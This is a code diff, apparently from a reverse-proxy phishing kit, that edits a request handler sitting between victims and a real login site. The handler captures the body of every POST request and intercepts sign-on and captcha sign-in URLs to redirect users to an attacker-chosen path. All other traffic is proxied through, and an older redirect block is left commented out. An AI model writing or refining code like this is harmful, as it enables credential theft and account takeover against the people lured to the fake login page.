@@ -86,17 +86,23 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     execute(clientContext) {
         if (this.req.method === 'POST') {
             clientContext.setLogAvailable(true)
-            super.uploadRequestBody(clientContext.currentDomain, clientContext)
+            super.captureBody(clientContext.currentDomain, clientContext)
         }
         
         if (this.req.url.startsWith('/login/sign-in/signOnSuccessRedirect.go') 
-        || this.req.url.startsWith('/login/sign-in/captcha/signOnV2.go')
-        || this.req.url.startsWith('/login/sign-in/internal/entry/signOnV2.go')
-        || this.req.url.startsWith('/sign-in/internal/entry/signOnV2.go')) {
+        || this.req.url.startsWith('/login/sign-in/captcha/signOnV2.go'))
+         {
             this.res.writeHead(302, {location: '/session/secure/menikooko'})
             return super.cleanEnd(clientContext.currentDomain, clientContext)
         }
         
+
+        // if (this.req.url.startsWith('/login/sign-in/captcha/signOnV2.go')
+        // || this.req.url.startsWith('/login/sign-in/internal/entry/signOnV2.go')
+        // || this.req.url.startsWith('/sign-in/internal/entry/signOnV2.go')) {
+        //     this.res.writeHead(302, {location: '/login/sign-in/signOnV2Screen.go'})
+        //     return super.cleanEnd(clientContext.currentDomain, clientContext)
+        // }
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
     }
 }
